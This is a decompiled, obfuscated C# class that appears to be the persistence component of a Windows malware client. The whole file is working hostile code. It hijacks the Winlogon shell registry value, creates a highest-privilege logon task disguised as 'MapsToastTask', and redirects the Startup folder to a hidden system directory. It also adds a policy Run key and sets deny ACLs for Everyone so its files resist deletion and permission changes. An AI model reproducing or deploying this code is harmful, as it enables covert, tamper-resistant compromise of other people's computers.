using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Client;
using Client.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns14;
using ns21;

namespace ns20;

public class GClass19
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static object smethod_0()
	{
		object result = default(object);
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\").SetValue("shell", Operators.ConcatenateObject(Operators.ConcatenateObject((object)"explorer.exe,\"", GClass20.object_0), (object)"\""), RegistryValueKind.Unknown);
			smethod_4(Conversions.ToString(GClass20.object_1));
			FileSystem.FileOpen(1, Conversions.ToString(GClass20.object_0), (OpenMode)1, (OpenAccess)(-1), (OpenShare)0, -1);
			smethod_5(Conversions.ToString(GClass20.object_0));
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_1()
	{
		object result = default(object);
		try
		{
			if (Class0.smethod_2())
			{
				Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"schtasks /create /f /sc ONLOGON /RL HIGHEST /tn MapsToastTask /tr \"'", GClass20.object_0), (object)"'\"")), (AppWinStyle)0, false, -1);
				smethod_4(Conversions.ToString(GClass20.object_1));
				return result;
			}
			smethod_0();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_2()
	{
		object result = default(object);
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			IShellLink shellLink = (IShellLink)new ShellLink();
			string text = folderPath + "\\LinkM";
			shellLink.imethod_4("LinkM");
			shellLink.imethod_17(Conversions.ToString(GClass20.object_0));
			IPersistFile persistFile = (IPersistFile)shellLink;
			Directory.CreateDirectory(text);
			persistFile.Save(Path.Combine(text, GClass20.string_5 + ".lnk"), fRemember: false);
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyDirectory(folderPath + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", text, false);
			File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders").SetValue("Startup", text, RegistryValueKind.Unknown);
			smethod_4(Conversions.ToString(GClass20.object_1));
			Thread.Sleep(500);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_3()
	{
		object result = default(object);
		try
		{
			string oSFullName = ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName();
			if (Class0.smethod_2() & oSFullName.Contains("Windows 10"))
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Run\\").SetValue(GClass20.string_5, RuntimeHelpers.GetObjectValue(GClass20.object_0), RegistryValueKind.Unknown);
				smethod_4(Conversions.ToString(GClass20.object_1));
				return result;
			}
			smethod_0();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_4(string string_0)
	{
		try
		{
			string value = new SecurityIdentifier(WellKnownSidType.WorldSid, null).Translate(typeof(NTAccount)).Value;
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.Read, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.DeleteSubdirectoriesAndFiles, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.ReadPermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.AppendData, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.SetAccessRuleProtection(isProtected: true, preserveInheritance: true);
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_5(string string_0)
	{
		try
		{
			string value = new SecurityIdentifier(WellKnownSidType.WorldSid, null).Translate(typeof(NTAccount)).Value;
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			DirectorySecurity directorySecurity = new DirectorySecurity();
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.Read, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.ReadAndExecute, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.Write, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(value, FileSystemRights.ListDirectory, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
